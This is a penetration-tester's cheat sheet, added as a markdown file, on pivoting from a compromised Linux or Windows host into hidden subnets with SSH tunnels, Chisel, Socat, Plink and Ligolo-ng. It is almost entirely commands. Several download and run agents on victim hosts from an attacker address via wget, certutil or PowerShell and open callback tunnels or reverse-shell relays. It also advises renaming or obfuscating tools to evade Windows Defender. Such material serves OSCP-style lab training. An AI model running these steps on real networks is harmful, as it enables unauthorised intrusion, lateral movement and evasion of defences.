@@ -1,0 +1,406 @@
+# Linux Pivoting Cheat Sheet
+> SSH Tunneling · Chisel · Socat · Plink · Ligolo-ng
+
+---
+
+## Scenario
+
+You have a reverse shell from **Host1** back to **Kali**. Host1 has two NICs — one facing you, one facing a hidden subnet where **Host2** lives. Your goal is to reach Host2.
+
+| Host | Role |
+|------|------|
+| Kali | Your attacker machine |
+| Host1 | Compromised box with 2 NICs (pivot point) |
+| Host2 | Target only reachable through Host1 |
+
+---
+
+## Method 1 — SSH Dynamic Port Forward (`-D`)
+
+> Requires SSH running on Host1 and valid credentials or a planted SSH key.
+
+**Step 1 — Open SOCKS proxy (Kali)**
+```bash
+ssh -D 3333 -N host1user@HOST1_IP
+# -D 3333   opens SOCKS5 proxy on Kali port 3333
+# -N         no command, just hold the tunnel open
+```
+
+**Step 2 — Configure proxychains (Kali)**
+```bash
+sudo nano /etc/proxychains.conf
+# Make sure the last line is:
+socks5  127.0.0.1  3333
+```
+
+**Step 3 — Reach Host2 through Host1 (Kali)**
+```bash
+proxychains ssh host2user@HOST2_IP
+proxychains nmap -sT -Pn HOST2_IP
+proxychains curl http://HOST2_IP
+```
+
+**Traffic path:** `Kali → SSH tunnel → Host1 → Host2`
+
+**Fails when:**
+- SSH not running on Host1
+- `AllowTcpForwarding no` is set in `/etc/ssh/sshd_config`
+- No valid SSH credentials for Host1
+- Host1 shell user has `/sbin/nologin` as their shell
+
+---
+
+## Method 2 — Chisel (Recommended)
+
+> Does not require SSH on Host1. Works with any reverse shell. Chisel binary must be transferred to Host1.
+
+**Step 1 — Start chisel server (Kali)**
+```bash
+chisel server -p 8080 --reverse
+```
+
+**Step 2 — Serve chisel binary (Kali, new terminal)**
+```bash
+cd /opt/chisel
+python3 -m http.server 9000
+```
+
+**Step 3 — Download and run chisel (Host1 reverse shell)**
+```bash
+wget http://KALI_IP:9000/chisel -O /tmp/chisel
+chmod +x /tmp/chisel
+/tmp/chisel client KALI_IP:8080 R:socks
+# R:socks creates a reverse SOCKS5 tunnel back to Kali
+```
+
+**Step 4 — Configure proxychains (Kali)**
+```bash
+sudo nano /etc/proxychains.conf
+# Chisel default SOCKS port is 1080:
+socks5  127.0.0.1  1080
+```
+
+**Step 5 — Reach Host2 (Kali)**
+```bash
+proxychains ssh host2user@HOST2_IP
+proxychains nmap -sT -Pn HOST2_IP
+```
+
+**Traffic path:** `Kali → chisel tunnel → Host1 → Host2`
+
+**Notes:**
+- No SSH required on Host1 — just execute a binary
+- Use `tun0` instead of `eth0` for VPN-based labs (OSCP)
+- `autoroute` NOT required — proxychains handles routing
+
+---
+
+## Method 3 — Socat Port Forward
+
+> Useful for forwarding a single port when you cannot run proxychains. Good for exposing one specific service on Host2.
+
+**Step 1 — Forward a port on Host1 (Host1 reverse shell)**
+```bash
+# Forward Host1:8888 → Host2:80
+socat TCP-LISTEN:8888,fork TCP:HOST2_IP:80 &
+
+# Forward Host1:4444 → Host2:22 (SSH)
+socat TCP-LISTEN:4444,fork TCP:HOST2_IP:22 &
+```
+
+**Step 2 — Connect from Kali directly to Host1's forwarded port**
+```bash
+# Browse Host2's web server
+curl http://HOST1_IP:8888
+
+# SSH to Host2 via Host1
+ssh -p 4444 host2user@HOST1_IP
+```
+
+**Notes:**
+- Only forwards ONE port at a time — not a full proxy
+- Requires socat installed on Host1 (common on Linux)
+- Background the listener with `&` so your shell stays interactive
+
+---
+
+## Method 4 — Plink.exe (Windows Host1)
+
+> Plink is PuTTY's command-line SSH client. Use this when Host1 is Windows and you need to create a tunnel back to Kali.
+
+**Step 1 — Serve plink.exe from Kali**
+```bash
+# plink.exe is in /usr/share/windows-resources/binaries/
+python3 -m http.server 9000
+```
+
+**Step 2 — Download plink on Host1 (Windows shell)**
+```cmd
+certutil -urlcache -split -f http://KALI_IP:9000/plink.exe C:\Windows\Temp\plink.exe
+```
+```powershell
+powershell -c "(New-Object Net.WebClient).DownloadFile('http://KALI_IP:9000/plink.exe','C:\Windows\Temp\plink.exe')"
+```
+
+**Step 3 — Create dynamic SOCKS tunnel (Host1 Windows shell)**
+```cmd
+C:\Windows\Temp\plink.exe -D 3333 -N -ssh kaliuser@KALI_IP
+# Accept the host key prompt with 'y'
+```
+
+**Step 4 — OR reverse tunnel back to Kali (more reliable)**
+```bash
+# On Kali first — enable SSH if needed:
+sudo systemctl start ssh
+```
+```cmd
+# On Host1 Windows — forward remote port 3333 on Kali as SOCKS:
+C:\Windows\Temp\plink.exe -R 3333 -N -ssh kaliuser@KALI_IP
+```
+
+**Step 5 — proxychains on Kali**
+```bash
+# /etc/proxychains.conf:
+socks5  127.0.0.1  3333
+
+proxychains ssh host2user@HOST2_IP
+```
+
+**Notes:**
+- Plink prompts to accept SSH host key — answer `y` or pre-accept with `-batch`
+- Make sure Kali SSH is running: `sudo systemctl start ssh`
+- Windows Defender may flag plink — rename it if blocked
+
+---
+
+## Method 5 — Ligolo-ng (Advanced)
+
+> Creates a real TUN interface on Kali. No proxychains needed — every tool works natively as if Host2 is on your local network. Supports UDP, SYN scans, and multi-hop double pivots.
+
+### Single Pivot
+
+**One-time setup — Create TUN interface (Kali)**
+```bash
+sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
+```
+
+**Step 1 — Start ligolo proxy (Kali)**
+```bash
+./proxy -selfcert -laddr 0.0.0.0:11601
+# -selfcert   generates a self-signed cert (no setup needed)
+# A console prompt will appear — leave this running
+```
+
+**Step 2 — Transfer and run agent on Host1**
+```bash
+# Serve from Kali:
+python3 -m http.server 9000
+
+# On Host1 (reverse shell):
+wget http://KALI_IP:9000/agent -O /tmp/agent
+chmod +x /tmp/agent
+/tmp/agent -connect KALI_IP:11601 -ignore-cert
+```
+
+**Step 3 — Start tunnel in ligolo console (Kali)**
+```
+session    # lists connected agents, select Host1
+start      # activates the tunnel
+```
+
+**Step 4 — Add route to Host2 subnet (Kali, new terminal)**
+```bash
+sudo ip route add 10.10.10.0/24 dev ligolo
+# Replace 10.10.10.0/24 with Host2's actual subnet
+```
+
+**Step 5 — Reach Host2 directly, no proxychains**
+```bash
+nmap -sV -sC 10.10.10.50
+ssh host2user@10.10.10.50
+evil-winrm -i 10.10.10.50 -u admin -p Password1
+crackmapexec smb 10.10.10.50
+curl http://10.10.10.50
+```
+
+**Traffic path:** `Kali → ligolo TUN → Host1 → Host2`
+
+---
+
+### Double Pivot (Host1 → Host2 → Host3)
+
+You have a shell on Host2 and need to reach Host3 on a third subnet that only Host2 can see.
+
+**Step 1 — Add a listener on Host1 via ligolo console**
+```
+# In ligolo console, with Host1 session active:
+listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11601
+# Host1 listens on :11602 and forwards back to Kali ligolo proxy
+```
+
+**Step 2 — Run agent on Host2, connect via Host1**
+```bash
+# On Host2:
+wget http://HOST1_IP:9000/agent -O /tmp/agent
+chmod +x /tmp/agent
+/tmp/agent -connect HOST1_IP:11602 -ignore-cert
+```
+
+**Step 3 — Switch session and start**
+```
+session    # now shows Host2 agent — select it
+start      # start tunnel for Host2
+```
+
+**Step 4 — Add route to Host3 subnet (Kali)**
+```bash
+sudo ip route add 172.16.5.0/24 dev ligolo
+```
+
+**Step 5 — Reach Host3 directly from Kali**
+```bash
+nmap -sV 172.16.5.100
+ssh host3user@172.16.5.100
+```
+
+**Traffic path:** `Kali → ligolo TUN → Host1 → Host2 → Host3`
+
+---
+
+### Catching Reverse Shells from Host2
+
+Host2 only knows about Host1, not Kali. Use a ligolo listener to make Kali reachable via Host1.
+
+**Step 1 — Add reverse shell listener in ligolo console**
+```
+# With Host1 session active:
+listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444
+# Host1 listens on :4444 and forwards to Kali:4444
+```
+
+**Step 2 — Start nc listener on Kali**
+```bash
+nc -lvnp 4444
+```
+
+**Step 3 — Point exploit on Host2 at Host1**
+```
+LHOST = HOST1_IP
+LPORT = 4444
+# Shell: Host2 → Host1:4444 → forwarded to Kali:4444
+```
+
+---
+
+### Ligolo-ng Agent Reference
+
+**Recommended folder structure on Kali**
+```
+/opt/ligolo/
+  proxy                    # Kali proxy (Linux amd64)
+  agent                    # Linux target (amd64)
+  agent-linux-386          # Linux target (32-bit)
+  agent.exe                # Windows target (amd64)
+  agent-windows-386.exe    # Windows target (32-bit)
+```
+> Download from: https://github.com/nicocha30/ligolo-ng/releases
+
+**Serve agent to target (Kali)**
+```bash
+cd /opt/ligolo
+python3 -m http.server 9000
+```
+
+**Download and run — Linux target**
+```bash
+wget http://KALI_IP:9000/agent -O /tmp/agent
+chmod +x /tmp/agent
+/tmp/agent -connect KALI_IP:11601 -ignore-cert
+```
+
+**Download and run — Windows target**
+```powershell
+Invoke-WebRequest http://KALI_IP:9000/agent.exe -OutFile C:\Windows\Temp\agent.exe
+C:\Windows\Temp\agent.exe -connect KALI_IP:11601 -ignore-cert
+```
+```cmd
+certutil -urlcache -split -f http://KALI_IP:9000/agent.exe C:\Windows\Temp\agent.exe
+C:\Windows\Temp\agent.exe -connect KALI_IP:11601 -ignore-cert
+```
+
+**Run agent silently in background**
+```bash
+# Linux:
+nohup /tmp/agent -connect KALI_IP:11601 -ignore-cert > /dev/null 2>&1 &
+
+# Windows:
+start /b C:\Windows\Temp\agent.exe -connect KALI_IP:11601 -ignore-cert
+```
+
+**If port 11601 is blocked — use 443 or 80**
+```bash
+# Kali:
+./proxy -selfcert -laddr 0.0.0.0:443
+
+# Target:
+/tmp/agent -connect KALI_IP:443 -ignore-cert
+```
+
+**Proxy console commands**
+
+| Command | Description |
+|---------|-------------|
+| `session` | List connected agents and select one |
+| `start` | Start tunnel for selected session |
+| `stop` | Stop the active tunnel |
+| `listener_add` | `--addr 0.0.0.0:PORT --to 127.0.0.1:PORT` |
+| `listener_list` | Show active listeners on current session |
+| `listener_stop` | Stop a listener by ID |
+| `ifconfig` | Show network interfaces on target host |
+
+**Key behaviors:**
+- Agent has no interactive mode — all control is from the Kali proxy console
+- Agent auto-reconnects if tunnel drops — no need to re-run on target
+- No SSH or special services needed on target — just execute the binary
+- No PowerShell execution policy issues — it is a compiled binary, not a script
+- Windows Defender may flag it — rename or obfuscate if blocked
+
+---
+
+## Bonus — SSH Local Port Forward (`-L`)
+
+> Use when you only need to reach ONE specific port on Host2. Simpler than a full SOCKS proxy.
+
+```bash
+# Access Host2 port 80 via localhost:8080
+ssh -L 8080:HOST2_IP:80 host1user@HOST1_IP
+
+# Access Host2 SSH via localhost:2222
+ssh -L 2222:HOST2_IP:22 host1user@HOST1_IP
+
+# Then connect:
+curl http://localhost:8080
+ssh -p 2222 host2user@localhost
+```
+
+---
+
+## Quick Reference
+
+| Method | Requires on Host1 | proxychains? | Best For |
+|--------|-------------------|:------------:|----------|
+| SSH `-D` | SSH service + creds | Yes | Quick pivot when SSH is available |
+| Chisel | Run a binary | Yes | Most reliable, no SSH needed |
+| Socat | socat installed | No | Single port forward |
+| Plink | Windows Host1 | Yes | Windows pivot boxes |
+| Ligolo-ng | Run a binary | No | Full network access, UDP, SYN scans |
+| SSH `-L` | SSH service + creds | No | One specific port only |
+
+| | Ligolo-ng | Chisel |
+|--|-----------|--------|
+| Interface | Full TUN (no proxychains) | SOCKS proxy (proxychains required) |
+| Protocols | TCP + UDP | TCP only |
+| Nmap SYN scans | Yes | No |
+| Double pivot | Built-in | Manual |
+| Setup complexity | Moderate | Simple |
